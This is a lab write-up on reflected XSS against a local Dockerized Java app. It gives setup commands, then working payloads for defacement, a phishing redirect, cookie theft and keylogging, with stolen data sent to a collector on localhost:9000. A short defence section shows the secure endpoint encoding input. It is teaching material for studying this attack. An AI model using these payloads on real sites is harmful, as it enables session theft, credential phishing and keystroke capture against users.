### Reflected XSS
---

>This lab exercise is for understanding various XSS attacks. 

#### **Lab Image : ReflectedXSS**

## Attack

* Step 1: Open browser and go to url

    ```
    http://localhost
    ```

    > **Note:** Replace `localhost` with your server url

* Step 2: Change to directory 

    ```
    cd /root/reflected-xss
    ```

* Step 3: Build the project

    ```
    mvn package
    ```

* Step 4: Now start the app

    ```
    docker-compose up 
    ```

* Step 5: Now browse to url

    ```
    http://localhost:8888/ReflectedXSS/insecure
    ```

    > **Note:** Replace `localhost` with your server ip

* Step 6: Perform a normal activity

    ```
    http://localhost:8888/ReflectedXSS/insecure?name=IronMan
    ```
    

* Step 7: Try these payloads to perform a XSS attack
    

    * To gain sensitive information

        ```
        http://localhost:8888/ReflectedXSS/secure?name=<script>alert(document.cookie)</script>
        ```            


    * To deface a website
      
        ```
        http://localhost:8888/ReflectedXSS/insecure?name=%3Cscript%3Edocument.body.innerHTML%3D%22%3Ch1%3EYou%20have%20been%20hacked%3C%2Fh1%3E%3Cimg%20src%3D'https%3A%2F%2Fimages.fineartamerica.com%2Fimages%2Fartworkimages%2Fmediumlarge%2F2%2Fheath-ledger-joker-portrait-madura-venkatachalam.jpg'%2F%3E%22%3C%2Fscript%3E
        ```
            
        
    * To perform phishing
    
        ```
        http://localhost:8888/ReflectedXSS/insecure?name=<script>window.location="http://localhost:9000/gmail.html"</script>
        ```
    
    * To steal cookie
    
        ```
        http://localhost:8888/ReflectedXSS/insecure?name=%3Cscript%3Evar%20a%3Dnew%20XMLHttpRequest()%3Ba.open(%22GET%22%2C%22http%3A%2F%2Flocalhost%3A9000%2F%3Fdomain%3D%22%2Bdocument.cookie)%3Ba.send()%3B%3C%2Fscript%3E
        ```
        
    * To Perform keylogging
​    
        ```
        http://localhost:8888/ReflectedXSS/insecure?name=%3Cscript%3E%0Adocument.addEventListener(%22keyup%22%2C%20function(e)%7B%0A%09var%20x%20%3D%20new%20XMLHttpRequest()%3B%0A%09var%20url%20%3D%20%22http%3A%2F%2Flocalhost%3A9000%3F%22%2Be.key%0A%09x.open(%22GET%22%2Curl%20%2C%20true)%3B%0A%09x.send()%3B%0A%7D)%3B%0A%3C%2Fscript%3E
        ```
## Defend

* Step 1: Now browse to url

    ```
    http://localhost:8888/ReflectedXSS/secure
    ```

    > **Note:** Replace `localhost` with your server ip

* Step 2: Try these payloads to perform various XSS attacks

    * To gain sensitive information

        ```
        http://localhost:8888/ReflectedXSS/secure?name=<script>alert(document.cookie)</script>
        ```
        

    This should encoded and should render as normal html
